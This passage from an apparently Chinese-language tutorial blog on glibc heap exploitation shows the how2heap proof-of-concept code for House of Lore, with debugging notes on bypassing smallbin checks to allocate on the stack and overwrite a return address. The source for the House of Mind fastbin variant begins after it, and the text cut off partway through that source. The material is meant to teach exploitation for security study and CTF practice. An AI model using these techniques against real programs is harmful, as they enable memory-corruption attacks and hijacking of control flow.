<h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-14"><a href="#调试-14" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201716247.png"
                      alt="image-20231012201716247"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201759897.png"
                      alt="image-20231012201759897"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201828914.png"
                      alt="image-20231012201828914"
                ></p>
<p>首先申请一个 <code>0x110</code>大小的堆块，然后布置栈上两个 <code>stack_buffer</code> 结构，即 <code>stack1_fd-&gt;small_chunk</code>，<code>stack1_bk-&gt;stack2_prev</code> ，<code>stack2_fd-&gt;stack1_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211308891.png"
                      alt="image-20231012211308891"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211034680.png"
                      alt="image-20231012211034680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211530114.png"
                      alt="image-20231012211530114"
                ></p>
<p>申请<code>0x3f0</code> 大小的 <code>chunk</code> 隔离 <code>top_chunk</code> ，然后将 <code>0x111</code> 的 <code>chunk</code> 放进 <code>unsorted_bin</code> ，申请 <code>（large_chunk）0x4c0</code> 大小的 <code>chunk</code> 触发 <code>consolidate</code> 机制再次将其再次放入 <code>small_bin</code> 中，并修改其 <code>bk-&gt;stack1_prev</code>。</p>
<p>此时：</p>
<p>FD：<code>stack2_fd-&gt;stack1_prev;stack1_fd-&gt;small_chunk_fd;</code></p>
<p>BK：<code>small_chunk_bk-&gt;stack1_prev;stack1_bk-&gt;stack2_prev;</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第二种情况，small bin 中存在空闲的 chunk。</span></span><br><span class="line"><span class="comment">// 找到倒数第二个 chunk(small_chunk)-&gt;bk。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line"><span class="built_in">set_inuse_bit_at_offset</span>(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure></div>

<p>然后再次申请两个用户区为 <code>0x100</code>大小的 <code>chunk</code>，第一次申请时绕过以上验证，此时 <code>bck(stack1)_fd-&gt;small_chunk。</code>，第二次申请同理，要取出 <code>victim=stack1</code> ，此时 <code>stack_2_fd-&gt;stack_1_prev; stack1_bk-&gt;stack2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085422164.png"
                      alt="image-20231013085422164"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085545532.png"
                      alt="image-20231013085545532"
                ></p>
<p>然后申请两次 <code>0x110</code> 大小的 <code>chunk</code>，分别为 <code>p3</code> <code>p4</code>，会将 <code>small_chunk</code>  和 <code>stack1</code> 取出来，然后覆盖 <code>main</code> 返回地址为目标函数地址即可完成任意地址写。</p>
<h2 id="house-of-mind-fastbin"><a href="#house-of-mind-fastbin" class="headerlink" title="house_of_mind_fastbin"></a>house_of_mind_fastbin</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27;</span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x880) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above.</span></span><br><span 